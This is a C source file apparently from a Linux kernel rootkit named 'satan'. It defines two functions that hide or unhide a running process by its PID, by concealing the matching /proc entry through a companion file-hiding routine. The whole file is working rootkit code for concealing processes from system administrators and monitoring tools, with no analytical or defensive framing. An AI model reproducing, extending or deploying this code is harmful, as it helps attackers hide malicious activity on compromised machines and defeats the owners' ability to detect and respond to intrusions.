// Copyright (c) 2020 Marco Wang <m.aesophor@gmail.com>
#include "proc.h"

#include <linux/kernel.h>

#include "file.h"


#define PATH_BUF_SIZE 32
static char path_buf[PATH_BUF_SIZE] = {0};


/**
 * satan_proc_hide() - Hides a process by pid.
 * @path: the PID of the process to hide.
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_proc_hide(unsigned int pid)
{
        if (!pid)
                return 1;

        memset(path_buf, 0, PATH_BUF_SIZE);
        snprintf(path_buf, PATH_BUF_SIZE - 1, "/proc/%d", pid);

        return satan_file_hide(path_buf);
}

/**
 * satan_proc_unhide() - Unhides a hidden process by pid.
 * @path: the PID of the process to hide.
 *
 * Return: zero on success and non-zero otherwise.
 */
int satan_proc_unhide(unsigned int pid)
{
        if (!pid)
                return 1;

        memset(path_buf, 0, PATH_BUF_SIZE);
        snprintf(path_buf, PATH_BUF_SIZE - 1, "/proc/%d", pid);

        return satan_file_unhide(path_buf);
}
